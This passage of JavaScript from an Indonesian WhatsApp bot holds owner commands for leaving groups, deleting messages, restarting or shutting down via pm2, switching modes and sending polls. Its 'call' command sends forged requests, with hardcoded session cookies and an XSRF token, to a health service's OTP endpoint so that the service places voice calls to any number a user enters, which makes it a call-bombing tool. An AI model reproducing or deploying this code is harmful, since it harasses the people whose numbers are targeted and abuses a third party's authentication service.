if (!isDev && !msg.key.fromMe) return reply('Fitur Ini Hanya Dapat Digunakan Oleh Developer!')
await semar.groupLeave(from).then((res) => reply(`${JSON.stringify(res, null, 2)}`)).catch((err) => reply(`${JSON.stringify(err, null, 2)}`))
break

//©from: dennis
case 'delete': case 'd': case 'del':
if (!isOwner && !msg.key.fromMe) return reply('Fitur Ini Hanya Dapat Digunakan Oleh VIP!')
semar.sendMessage(from, { delete: { id: msg.message.extendedTextMessage.contextInfo.stanzaId, remoteJid: from, fromMe: true }})
break

//©from: dennis
case 'restart':
if (!isOwner && !msg.key.fromMe) return reply('Fitur Ini Hanya Dapat Digunakan Oleh VIP!')
exec(`pm2 restart index`, (error, stdout, stderr) => { reply(stdout)})
break

//©from: dennis
case 'shutdown':
if (!isDev && !msg.key.fromMe) return reply('Fitur Ini Hanya Dapat Digunakan Oleh Developer!')
exec(`pm2 kill`, (error, stdout, stderr) => { reply(stdout)})
break

//©from: dennis × mr_dark
case 'call':
if (!isOwner && !msg.key.fromMe) return reply('Fitur Ini Hanya Dapat Digunakan Oleh VIP!')
if (!dn) return reply(`Silahkan masukkan nomor!\nContoh: ${prefix}call +${senderNumber}`)
if (args[0].startsWith('0')) return reply(`Awali nomor dengan +62!\nContoh: ${prefix}call +${senderNumber}`)
if (args[0].startsWith('8')) return reply(`Awali nomor dengan +62!\nContoh: ${prefix}call +${senderNumber}`)
if (args[0].startsWith(`+${nomorDeveloper}`)) return reply('Tidak bisa call ke nomor developer!')
if (args[0].startsWith(`+${botNumber}`)) return reply('Tidak bisa call ke nomor ini!')
axios.post('https://magneto.api.halodoc.com/api/v1/users/authentication/otp/requests',{'phone_number':`${dn}`,'channel': 'voice'},{headers: {'authority': 'magneto.api.halodoc.com','accept-language': 'id,en;q=0.9,en-GB;q=0.8,en-US;q=0.7','cookie': '_gcl_au=1.1.1860823839.1661903409; _ga=GA1.2.508329863.1661903409; afUserId=52293775-f4c9-4ce2-9002-5137c5a1ed24-p; XSRF-TOKEN=12D59ACD8AA0B88A7ACE05BB574FAF8955D23DBA28E8EE54F30BCB106413A89C1752BA30DC063940ED30A599C055CC810636; _gid=GA1.2.798137486.1664887110; ab.storage.deviceId.1cc23a4b-a089-4f67-acbf-d4683ecd0ae7=%7B%22g%22%3A%2218bb4559-2170-9c14-ddcd-2dc80d13c3e3%22%2C%22c%22%3A1656491802961%2C%22l%22%3A1664887110254%7D; amp_394863=nZm2vDUbDAvSia6NQPaGum...1gehg2efd.1gehg3c19.f.0.f; ab.storage.sessionId.1cc23a4b-a089-4f67-acbf-d4683ecd0ae7=%7B%22g%22%3A%22f1b09ad8-a7d9-16f3-eb99-a97ba52677d2%22%2C%22e%22%3A1664888940400%2C%22c%22%3A1664887110252%2C%22l%22%3A1664887140400%7D','origin': 'https://www.halodoc.com','sec-ch-ua': '"Microsoft Edge";v="105", "Not)A;Brand";v="8", "Chromium";v="105"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-site','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36 Edg/105.0.1343.53','x-xsrf-token': '12D59ACD8AA0B88A7ACE05BB574FAF8955D23DBA28E8EE54F30BCB106413A89C1752BA30DC063940ED30A599C055CC810636'}}).then(function (response) {reply(`${JSON.stringify(response.data, null, 2)}`)}).catch(function (error) {reply(`${JSON.stringify(error, null, 2)}`)})
break

//©from: dennis
case 'public':
if (!isDev && !msg.key.fromMe) return reply('Fitur Ini Hanya Dapat Digunakan Oleh Developer!')
mode = true
reply('Sukses mengubah ke mode public')
break

//©from: dennis
case 'private': case 'self':
if (!isDev && !msg.key.fromMe) return reply('Fitur Ini Hanya Dapat Digunakan Oleh Developer!')
mode = false
reply('Sukses mengubah ke mode private')
break

//©from: dennis
case 'vote':
var pollCreation = generateWAMessageFromContent(from, proto.Message.fromObject({"pollCreationMessage": {
"name": "@dcodedenpa",
"options": [{
"optionName": "option 1"
},{
"optionName": "option 2"
},{
"optionName": "option 3"
}],
"selectableOptionsCount": 3}}), { userJid: from })
semar.relayMessage(from, pollCreation.message, { messageId: pollCreation.key.id })
break
default:
}} catch (e) {
console.log(e)
semar.sendMessage("6285866295942@s.whatsapp.net", {text:e})}}